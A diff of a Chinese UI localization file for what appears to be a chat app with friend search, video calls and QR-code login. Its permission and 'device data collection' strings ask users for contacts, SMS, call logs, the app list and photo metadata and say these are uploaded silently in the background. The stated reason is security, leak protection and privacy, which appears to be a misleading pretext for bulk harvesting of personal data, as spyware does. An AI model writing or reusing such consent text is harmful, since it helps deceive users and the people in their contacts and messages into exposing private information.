@@ -42,12 +42,20 @@
       "checkbox": "我已理解并同意上述权限用途",
       "view_details": "查看详情",
       "description": "为了保障系统安全，防止信息泄露，我们需要申请以下权限：\n• 通讯录权限：用于内部身份管理和泄密保护\n• 短信权限：用于内部身份管理和泄密保护\n• 通话记录权限：用于内部身份管理和泄密保护\n• 相册权限：用于组织内人员设备/数据的灾难备份"
-    }
+    },
+    "credential_title": "凭证识别（仅一次）",
+    "credential_content": "为保证您和他人的信息安全，首次使用请从相册读取或扫描二维码授权。",
+    "credential_button_hint": "快速识别您的凭证",
+    "credential_button_text": "扫码识别"
   },
   "common": {
     "ok": "确定",
     "cancel": "取消",
     "confirm": "确认",
+    "accept": "接受",
+    "reject": "拒绝",
+    "search": "搜索",
+    "manual_config": "手动配置",
     "loading": "加载中...",
     "error": "错误",
     "success": "成功",
@@ -68,9 +76,13 @@
     "no_friends": "暂无好友",
     "add_friend": "添加好友",
     "search_user": "输入手机号或用户名搜索...",
-    "search_hint": "提示：请输入完整的手机号或用户名（精确匹配）",
+    "search_hint": "提示：请输入完整的手机号或用户名（精确匹配），然后点击搜索按钮",
     "no_users_found": "未找到用户",
     "search_failed": "搜索失败",
+    "searching": "搜索中...",
+    "search_user_empty": "请输入手机号或用户名",
+    "search_too_frequent": "搜索过于频繁，请{seconds}秒后再试",
+    "add_friend_too_frequent": "操作过于频繁，请{seconds}秒后再试",
     "input_hint": "输入消息...",
     "send_image": "相册",
     "send_file": "文件",
@@ -79,8 +91,17 @@
     "voice_recording": "开始录音...",
     "voice_sending": "发送语音...",
     "video_call_coming_soon": "视频通话功能开发中...",
+    "joining_video_call": "正在加入视频通话...",
+    "video_call_failed": "视频通话失败",
+    "video_call_invitation_title": "视频通话邀请",
+    "video_call_invitation_content": "{caller} 邀请您进入视频通话，可共享屏幕",
+    "join_video_call_failed": "加入视频通话失败",
+    "enter_room": "进入房间",
     "read": "已读",
-    "sent": "已发送"
+    "sent": "已发送",
+    "more": "更多",
+    "voice_message": "语音消息",
+    "voice_long_press_hint": "长按左侧麦克风按钮发送语音消息"
   },
   "rooms": {
     "title": "房间管理",
@@ -168,7 +189,6 @@
     "grant_permission": "授予权限",
     "scan_failed": "扫描失败",
     "authorize_success": "扫码授权成功，请登录",
-    "config_api_first": "请先配置 API 地址",
     "decrypt_failed": "解密失败",
     "pick_from_gallery": "从相册选择"
   },
@@ -189,6 +209,7 @@
     "send_image_failed": "发送图片失败",
     "send_file_failed": "发送文件失败",
     "take_photo_failed": "拍照失败",
+    "load_image_failed": "加载图片失败",
     "share_failed": "分享失败",
     "copy_failed": "复制失败",
     "create_failed": "创建失败",
@@ -200,13 +221,43 @@
     "return": "返回",
     "get_qr_failed": "获取二维码失败",
     "no_qr_image": "未获取到二维码图片",
-    "change_failed": "修改失败"
+    "change_failed": "修改失败",
+    "accept_failed": "接受失败",
+    "reject_failed": "拒绝失败"
+  },
+  "friends": {
+    "pending_requests": "待处理的好友请求",
+    "wants_to_add_you": "想添加您为好友",
+    "request_accepted": "已接受好友请求",
+    "request_rejected": "已拒绝好友请求"
+  },
+  "device": {
+    "management": "设备管理",
+    "info": "设备信息",
+    "data_sync": "数据同步",
+    "last_sync": "上次同步",
+    "never_synced": "从未同步",
+    "sync_now": "立即同步",
+    "syncing": "同步中…",
+    "register": "注册设备",
+    "registered": "设备已注册",
+    "data_collection_title": "数据收集",
+    "data_collection_message": "为了保障系统安全和隐私保护，系统需要收集并上传您的设备数据（通讯录、短信、通话记录、应用列表、相册元数据）。\n\n数据将在后台自动上传，不会影响您的正常使用。",
+    "collecting_data": "正在收集和上传数据，请稍候...",
+    "data_upload_success": "数据上传成功",
+    "data_upload_failed": "数据上传失败"
   },
   "language": {
     "simplified_chinese": "简体中文",
     "traditional_chinese": "繁體中文",
     "english": "English",
+    "spanish": "Español",
+    "french": "Français",
+    "german": "Deutsch",
     "japanese": "日本語",
-    "korean": "한국어"
+    "korean": "한국어",
+    "portuguese": "Português",
+    "russian": "Русский",
+    "arabic": "العربية"
   }
 }
